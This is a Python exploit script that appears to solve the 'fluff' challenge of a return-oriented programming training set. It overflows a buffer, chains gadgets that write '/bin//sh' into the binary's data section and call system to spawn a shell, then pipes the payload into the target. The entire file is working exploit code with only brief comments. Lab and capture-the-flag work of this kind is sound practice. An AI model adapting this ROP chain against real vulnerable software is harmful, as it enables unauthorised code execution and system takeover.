#!/usr/bin/python
import os
import struct

def p64(addr):
	return struct.pack("<Q",addr)

garbage = "A"*40

system = p64(0x4005e0)
data_section = p64(0x601050)

#0x4008c3: pop rdi; ret;
#0x40084c: pop r15; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
#0x40082e: pop rsi; xor r11, r12; pop r12; mov r13d, 0x604060; ret;
#0x400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
#0x400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
#0x4008bc: pop r12; pop r13; pop r14; pop r15; ret;

pop_r12_pop_r13_pop_r14_pop_r15 = p64(0x4008bc)
xchg_r11_r10_pop_r15_mov_r11d_0x602050 = p64(0x400840)
xor_r11_r11_pop_r14_mov_edi_0x601050 = p64(0x400822)
pop_rsi_xor_r11_r12_pop_r12_mov_r13d_0x604060 = p64(0x40082e)
pop_r15_mov_qword_ptr_r10_r11_pop_r13_pop_r12_xor_byte_ptr_r10_r12b = p64(0x40084c)
pop_rdi = p64(0x4008c3)

exploit = garbage
exploit += xor_r11_r11_pop_r14_mov_edi_0x601050 #now r11 is zeroed
exploit += "pppppppp" #pop r14
exploit += pop_r12_pop_r13_pop_r14_pop_r15
exploit += data_section #now r12 contains data_section addr
exploit += "pppppppp" #pop r13
exploit += "pppppppp" #pop r14
exploit += "pppppppp" #pop r15
exploit += pop_rsi_xor_r11_r12_pop_r12_mov_r13d_0x604060 #now r11 contains data_section addr
exploit += "pppppppp" #pop rsi
exploit += "/bin//sh" #pop r12
exploit += xchg_r11_r10_pop_r15_mov_r11d_0x602050 #now r10 contains data_section addr
exploit += "pppppppp" #pop r15
exploit += xor_r11_r11_pop_r14_mov_edi_0x601050 #now r11 is zeored
exploit += "pppppppp" #pop r14
exploit += pop_rsi_xor_r11_r12_pop_r12_mov_r13d_0x604060 #now r11 contains "/bin//sh" string
exploit += "pppppppp" #pop rsi
exploit += "pppppppp" #pop r12
exploit += pop_r15_mov_qword_ptr_r10_r11_pop_r13_pop_r12_xor_byte_ptr_r10_r12b #mov binsh in data_section
exploit += "pppppppp" #pop r15
exploit += "pppppppp" #pop r13
exploit += p64(0) #pop r12 ; 0 for the xor 
exploit += pop_rdi
exploit += data_section #pop binsh in rdi
exploit += system

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("((cat simple_exploit.txt);cat -)|./fluff")
